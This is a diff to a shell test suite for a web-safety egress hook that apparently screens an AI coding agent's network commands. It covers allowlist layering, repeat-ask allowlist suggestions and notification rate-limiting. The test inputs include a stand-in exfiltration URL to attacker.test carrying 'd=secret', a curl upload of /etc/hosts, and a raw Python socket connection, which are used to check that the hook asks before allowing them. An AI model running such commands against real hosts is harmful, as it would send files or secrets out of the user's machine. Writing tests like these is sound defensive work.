@@ -20,10 +20,10 @@ export CLAUDE_SESSION_ID="egtest-$$"
 ARM="/tmp/web-safety-session-${CLAUDE_SESSION_ID}-armed"
 CFG=$(mktemp -d)
 export WEB_SAFETY_CONFIG_DIR="$CFG"
-cleanup() { rm -rf "$CFG"; rm -rf /tmp/web-safety-session-"${CLAUDE_SESSION_ID}"-* /tmp/web-safety-scanner-last-notify; }
+cleanup() { rm -rf "$CFG"; rm -rf /tmp/web-safety-session-"${CLAUDE_SESSION_ID}"-* /tmp/web-safety-scanner-last-notify /tmp/web-safety-egress-last-notify; }
 trap cleanup EXIT
 
-reset_state() { rm -rf /tmp/web-safety-session-"${CLAUDE_SESSION_ID}"-* /tmp/web-safety-scanner-last-notify; }
+reset_state() { rm -rf /tmp/web-safety-session-"${CLAUDE_SESSION_ID}"-* /tmp/web-safety-scanner-last-notify /tmp/web-safety-egress-last-notify; }
 
 # ── Producer: scanner arms on HIGH ───────────────────────────────────────────
 reset_state
@@ -53,6 +53,75 @@ is_ask()     { printf '%s' "$1" | jq -e '.hookSpecificOutput.permissionDecision 
 is_block()   { printf '%s' "$1" | jq -e '.decision == "block"' >/dev/null 2>&1; }
 # Feed a Bash command WITH an explicit permission_mode; echo its stdout.
 egress_mode() { jq -nc --arg c "$1" --arg m "$2" '{tool_name:"Bash", tool_input:{command:$c}, permission_mode:$m}' | "$EGRESS"; }
+
+# ── Task 1: host_in_any_list multi-file OR (shared-lib unit) ──────────────────
+( . "$REPO_ROOT/scripts/web-safety-lib.sh"
+  f1=$(mktemp); f2=$(mktemp); printf 'a.example\n' > "$f1"; printf 'b.example\n' > "$f2"
+  host_in_any_list "sub.a.example" "$f1" "$f2"; r1=$?   # subdomain hit in file 1
+  host_in_any_list "b.example"     "$f1" "$f2"; r2=$?   # exact hit in file 2
+  host_in_any_list "c.example"     "$f1" "$f2"; r3=$?   # no hit
+  host_in_any_list "b.example"     "/no/such/file" "$f2"; r4=$?  # skips missing file
+  rm -f "$f1" "$f2"
+  [ $r1 -eq 0 ] && [ $r2 -eq 0 ] && [ $r3 -ne 0 ] && [ $r4 -eq 0 ] ) \
+  && ok "host_in_any_list: OR across files, skips missing" \
+  || bad "host_in_any_list: OR across files, skips missing"
+
+# ── Task 2: shipped default allowlist layers under the user file ──────────────
+# Uses the DCA-finalized default hosts (arxiv.org, githubusercontent.com, …).
+reset_state; arm_fresh; rm -f "$CFG/url-allowlist.txt"
+out=$(egress_fetch "https://arxiv.org/abs/2410.10813"); ec=$?
+{ [ $ec -eq 0 ] && [ -z "$out" ]; } && ok "default allowlist: arxiv.org defers w/o user file" || bad "default: arxiv.org defers (out=$out)"
+out=$(egress_fetch "https://raw.githubusercontent.com/x/y/main/z"); ec=$?
+{ [ $ec -eq 0 ] && [ -z "$out" ]; } && ok "default allowlist: raw.githubusercontent.com (subdomain) defers" || bad "default: raw.githubusercontent.com defers (out=$out)"
+# DCA exclusion locked: github.com is NOT in the shipped default (repo traffic analytics).
+out=$(egress_fetch "https://github.com/owner/repo")
+is_ask "$out" && ok "default allowlist: github.com is EXCLUDED (still asks)" || bad "default: github.com excluded (out=$out)"
+out=$(egress_fetch "https://attacker.test/collect?d=secret")
+is_ask "$out" && ok "default allowlist: non-listed host still asks" || bad "default: non-listed still asks (out=$out)"
+echo "trusted.example.com" > "$CFG/url-allowlist.txt"
+out=$(egress_fetch "https://trusted.example.com/p"); ec=$?
+{ [ $ec -eq 0 ] && [ -z "$out" ]; } && ok "default allowlist: user file still honored" || bad "default: user file honored (out=$out)"
+rm -f "$CFG/url-allowlist.txt"
+out=$(WEB_SAFETY_DEFAULT_ALLOWLIST_DISABLE=1 egress_fetch "https://arxiv.org/abs/1")
+is_ask "$out" && ok "default allowlist: kill switch disables default" || bad "default: kill switch (out=$out)"
+out=$(egress_for "curl -d @/etc/hosts https://arxiv.org/in")
+is_ask "$out" && ok "default allowlist: upload to default host still asks (carve-out preserved)" || bad "default: upload to default host asks (out=$out)"
+reset_state
+
+# ── Task 3: one-shot allowlist suggestion after N asks to the same host ───────
+# The tally persists across egress calls in the session /tmp namespace; arm_fresh
+# does NOT clear it (only reset_state does), so 3 asks to the same host accumulate.
+sug() { printf '%s' "$1" | jq -re '.hookSpecificOutput.permissionDecisionReason | test("web-safety:allow")' >/dev/null 2>&1; }
+reset_state; rm -f "$CFG/url-allowlist.txt"
+arm_fresh; out1=$(egress_fetch "https://repeat.test/a")
+arm_fresh; out2=$(egress_fetch "https://repeat.test/b")
+sug "$out1" && bad "suggestion: not shown before threshold (ask 1)" || ok "suggestion: not shown before threshold (ask 1)"
+sug "$out2" && bad "suggestion: not shown before threshold (ask 2)" || ok "suggestion: not shown before threshold (ask 2)"
+arm_fresh; out3=$(egress_fetch "https://repeat.test/c")
+printf '%s' "$out3" | jq -re '.hookSpecificOutput.permissionDecisionReason | test("/web-safety:allow repeat.test")' >/dev/null 2>&1 \
+  && ok "suggestion: appears at threshold naming host" || bad "suggestion: appears at threshold (out=$out3)"
+arm_fresh; out4=$(egress_fetch "https://repeat.test/d")
+sug "$out4" && bad "suggestion: one-shot (must not repeat on ask 4)" || ok "suggestion: one-shot (not repeated on ask 4)"
+arm_fresh; outX=$(egress_fetch "https://other.test/a")
+sug "$outX" && bad "suggestion: per-host tally independent" || ok "suggestion: per-host tally independent"
+arm_fresh
+outN=$(egress_for "python3 -c 'import socket,os; socket.socket().connect((os.environ[\"H\"],443))'")
+sug "$outN" && bad "suggestion: skipped when host unknown (multi/none)" || ok "suggestion: skipped when host unknown (multi/none)"
+reset_state
+
+# ── Task 4: egress notify rate-limit (state-file assertion; toast unobservable) ─
+# Mirrors the scanner's 5s guard; the JSON decision must still emit every event.
+reset_state; arm_fresh; rm -f /tmp/web-safety-egress-last-notify
+out1=$(egress_fetch "https://attacker.test/1")
+is_ask "$out1" && ok "rate-limit: 1st ask still emits JSON" || bad "rate-limit: 1st JSON (out=$out1)"
+[ -f /tmp/web-safety-egress-last-notify ] && ok "rate-limit: state file created on first notify" || bad "rate-limit: state file created"
+ts1=$(cat /tmp/web-safety-egress-last-notify 2>/dev/null | tr -cd '0-9')
+[ -n "$ts1" ] && ok "rate-limit: timestamp recorded" || bad "rate-limit: timestamp recorded (ts1=$ts1)"
+arm_fresh; out2=$(egress_fetch "https://attacker.test/2")
+is_ask "$out2" && ok "rate-limit: 2nd ask still emits JSON (decision not gated)" || bad "rate-limit: 2nd JSON (out=$out2)"
+ts2=$(cat /tmp/web-safety-egress-last-notify 2>/dev/null | tr -cd '0-9')
+{ [ -n "$ts1" ] && [ "$ts1" = "$ts2" ]; } && ok "rate-limit: 2nd notify within window suppressed (ts unchanged)" || bad "rate-limit: ts unchanged (ts1=$ts1 ts2=$ts2)"
+reset_state
 
 # not armed → defer (exit 0, empty stdout)
 disarm
